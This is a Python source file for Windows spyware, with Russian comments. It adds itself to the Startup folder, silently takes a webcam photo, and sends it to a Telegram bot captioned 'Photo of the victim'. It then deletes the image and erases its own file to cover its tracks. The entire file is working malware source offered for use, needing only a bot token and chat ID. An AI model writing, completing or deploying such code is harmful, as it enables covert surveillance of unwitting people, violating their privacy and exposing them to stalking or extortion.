import cv2
import requests
import datetime
import os
import sys
import winshell
from win32com.client import Dispatch

# Токен и ID чата (лучше использовать переменные окружения)
BOT_TOKEN = ""
CHAT_ID = ""

def capture_image():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return None

    ret, frame = cap.read()
    if ret:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f'image_{timestamp}.jpg'
        cv2.imwrite(filename, frame)
        cap.release()
        return filename
    else:
        cap.release()
        return None

def send_image_via_telegram(image_path):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
    try:
        with open(image_path, 'rb') as image_file:
            files = {'photo': image_file}
            data = {'chat_id': CHAT_ID, 'caption': 'Фото жертвы:'}
            requests.post(url, files=files, data=data)
    except Exception as e:
        pass

def add_to_startup(file_path=None, key_name="CameraTelegramBot"):
    if file_path is None:
        file_path = os.path.abspath(sys.argv[0])

    startup_dir = winshell.startup()
    shortcut_path = os.path.join(startup_dir, f"{key_name}.lnk")

    if not os.path.exists(shortcut_path):
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = sys.executable
        shortcut.Arguments = f'"{file_path}"'
        shortcut.WorkingDirectory = os.path.dirname(file_path)
        shortcut.IconLocation = file_path
        shortcut.save()

def self_destruct():
    try:
        # Удаляем саму программу
        current_file = os.path.abspath(sys.argv[0])
        if os.path.exists(current_file):
            os.remove(current_file)

        # Удаляем папку, если она пуста
        folder = os.path.dirname(current_file)
        if os.path.exists(folder) and not os.listdir(folder):
            os.rmdir(folder)
    except Exception as e:
        pass

if __name__ == "__main__":
    add_to_startup()

    # Делаем фото
    image = capture_image()
    if image:
        # Отправляем фото
        send_image_via_telegram(image)
        # Удаляем фото после отправки
        if os.path.exists(image):
            os.remove(image)

    # Самоуничтожение программы
    self_destruct()